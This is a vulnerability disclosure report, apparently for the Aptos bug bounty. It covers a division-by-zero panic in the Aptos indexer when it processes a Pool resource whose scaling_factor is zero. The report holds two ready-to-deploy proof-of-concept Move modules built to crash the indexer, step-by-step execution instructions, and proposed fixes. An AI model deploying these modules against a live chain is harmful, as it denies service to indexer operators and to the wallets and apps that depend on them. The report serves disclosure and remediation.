# Audit Report

## Title
Division by Zero Panic in Indexer When Processing Malicious Pool Resources with scaling_factor = 0

## Summary
An attacker can crash the Aptos indexer by deploying a Move module that creates a `pool_u64_unbound::Pool` resource with `scaling_factor = 0`. When the indexer processes this malicious table item, it performs an unchecked division by zero, causing a panic that crashes the indexer process.

## Finding Description

The vulnerability exists in the indexer's processing of `pool_u64_unbound::Pool` resources from on-chain table items. The attack exploits two issues:

1. **Missing on-chain validation**: The Move framework allows creating Pool resources with `scaling_factor = 0` without validation [1](#0-0) 

2. **Missing off-chain validation**: The indexer performs division by `scaling_factor` without checking if it's zero [2](#0-1) 

**Attack Path:**

1. Attacker deploys a Move module containing:
   ```move
   module attacker::malicious {
       use aptos_std::pool_u64_unbound;
       use aptos_std::table;
       
       struct MaliciousResource has key {
           pools: table::Table<u64, pool_u64_unbound::Pool>,
       }
       
       public entry fun create(account: &signer) {
           let pools = table::new();
           table::add(&mut pools, 0, pool_u64_unbound::create_with_scaling_factor(0));
           move_to(account, MaliciousResource { pools });
       }
   }
   ```

2. When this transaction executes, it creates a `WriteTableItem` with type `0x1::pool_u64_unbound::Pool` containing `scaling_factor = 0`

3. The indexer processes all table items through `from_transaction()` [3](#0-2) 

4. It calls `get_inactive_pool_metadata_from_write_table_item()` which checks for type `0x1::pool_u64_unbound::Pool` [4](#0-3) 

5. The indexer deserializes the Pool and performs division without validation, causing a panic

Additional vulnerable division operations exist at:
- [5](#0-4) 
- [6](#0-5) 
- [7](#0-6) 

## Impact Explanation

This is a **High Severity** vulnerability per Aptos bug bounty criteria because it causes **API crashes**. The indexer is critical infrastructure that provides blockchain state querying capabilities. When the indexer crashes:

- API endpoints become unavailable
- DApps and wallets cannot query account balances, transaction history, or staking information
- The attack can be repeated indefinitely to maintain persistent denial of service
- Recovery requires manual intervention to skip the malicious transaction

Unlike validator nodes which continue operating, the indexer crash directly impacts user-facing services.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivial to execute:
- Requires no special privileges (any user can deploy Move modules)
- Low cost (minimal gas fees for module deployment)
- No complexity (simple module with one function call)
- Difficult to prevent without patching the indexer
- Can be automated for repeated attacks

The vulnerability is actively exploitable because:
1. The `create_with_scaling_factor()` function is public [8](#0-7) 
2. Pool struct has `store` ability, allowing it to be stored in tables [9](#0-8) 
3. The indexer processes ALL `pool_u64_unbound::Pool` table items, not just legitimate delegation pools

## Recommendation

Implement input validation in the indexer before performing division operations:

```rust
pub fn get_inactive_pool_metadata_from_write_table_item(
    write_table_item: &WriteTableItem,
    txn_version: i64,
) -> anyhow::Result<Option<PoolBalanceMetadata>> {
    let table_item_data = write_table_item.data.as_ref().unwrap();

    if let Some(StakeTableItem::Pool(inner)) = StakeTableItem::from_table_item_type(
        table_item_data.value_type.as_str(),
        &table_item_data.value,
        txn_version,
    )? {
        // SECURITY: Validate scaling_factor is non-zero before division
        if inner.scaling_factor.is_zero() {
            anyhow::bail!(
                "Invalid Pool at version {}: scaling_factor cannot be zero",
                txn_version
            );
        }
        
        let total_coins = inner.total_coins;
        let total_shares = &inner.total_shares / &inner.scaling_factor;
        Ok(Some(PoolBalanceMetadata { /* ... */ }))
    } else {
        Ok(None)
    }
}
```

Apply similar validation to all division operations in:
- `delegator_pools.rs` line 132
- `delegator_balances.rs` lines 90 and 151

**Alternative fix**: Add on-chain validation in Move framework:

```move
public fun create_with_scaling_factor(scaling_factor: u64): Pool {
    assert!(scaling_factor > 0, error::invalid_argument(EINVALID_SCALING_FACTOR));
    Pool {
        total_coins: 0,
        total_shares: 0,
        shares: table::new<address, u128>(),
        scaling_factor,
    }
}
```

## Proof of Concept

**Move Module (attacker deploys this):**

```move
module attacker::indexer_crash {
    use aptos_std::pool_u64_unbound;
    use aptos_std::table::{Self, Table};
    
    struct MaliciousPoolContainer has key {
        pools: Table<u64, pool_u64_unbound::Pool>,
    }
    
    /// Creates a Pool with scaling_factor = 0 and stores it
    /// This will crash the indexer when processing the WriteTableItem
    public entry fun trigger_indexer_crash(attacker: &signer) {
        let pools = table::new<u64, pool_u64_unbound::Pool>();
        
        // Create malicious pool with zero scaling factor
        let malicious_pool = pool_u64_unbound::create_with_scaling_factor(0);
        table::add(&mut pools, 0, malicious_pool);
        
        move_to(attacker, MaliciousPoolContainer { pools });
    }
}
```

**Execution Steps:**
1. Attacker compiles and publishes the module to the blockchain
2. Attacker calls `trigger_indexer_crash()` via transaction
3. Transaction commits successfully (on-chain validation passes)
4. Indexer processes the `WriteTableItem` containing the Pool
5. Division by zero occurs at line 160, causing panic
6. Indexer process crashes with error: "attempt to divide by zero"

**Notes**
- The vulnerability stems from the indexer trusting on-chain data without validation
- While legitimate delegation pools always use `SHARES_SCALING_FACTOR = 10000000000000000` [10](#0-9) , the indexer processes all Pool resources indiscriminately
- The delegation_pool module aliases `pool_u64_unbound` as `pool_u64` [11](#0-10) , confirming the indexer targets the correct type

### Citations

**File:** aptos-move/framework/aptos-stdlib/sources/pool_u64_unbound.move (L40-47)
```text
    struct Pool has store {
        total_coins: u64,
        total_shares: u128,
        shares: Table<address, u128>,
        // Default to 1. This can be used to minimize rounding errors when computing shares and coins amount.
        // However, users need to make sure the coins amount don't overflow when multiplied by the scaling factor.
        scaling_factor: u64,
    }
```

**File:** aptos-move/framework/aptos-stdlib/sources/pool_u64_unbound.move (L63-69)
```text
    public fun create_with_scaling_factor(scaling_factor: u64): Pool {
        Pool {
            total_coins: 0,
            total_shares: 0,
            shares: table::new<address, u128>(),
            scaling_factor,
        }
```

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L132-132)
```rust
                &inner.active_shares.total_shares / &inner.active_shares.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L159-160)
```rust
            let total_coins = inner.total_coins;
            let total_shares = &inner.total_shares / &inner.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L90-90)
```rust
            let shares = shares / &pool_balance.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L151-151)
```rust
            let shares = shares / &pool_balance.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L343-348)
```rust
                if let APIWriteSetChange::WriteTableItem(table_item) = wsc {
                    if let Some(map) =
                        Self::get_inactive_share_to_pool_mapping(table_item, txn_version).unwrap()
                    {
                        inactive_share_to_pool.extend(map);
                    }
```

**File:** crates/indexer/src/models/stake_models/stake_utils.rs (L101-104)
```rust
        match data_type {
            "0x1::pool_u64_unbound::Pool" => {
                serde_json::from_value(data.clone()).map(|inner| Some(StakeTableItem::Pool(inner)))
            },
```

**File:** aptos-move/framework/aptos-framework/sources/delegation_pool.move (L117-117)
```text
    use aptos_std::pool_u64_unbound::{Self as pool_u64, total_coins};
```

**File:** aptos-move/framework/aptos-framework/sources/delegation_pool.move (L247-247)
```text
    const SHARES_SCALING_FACTOR: u64 = 10000000000000000;
```
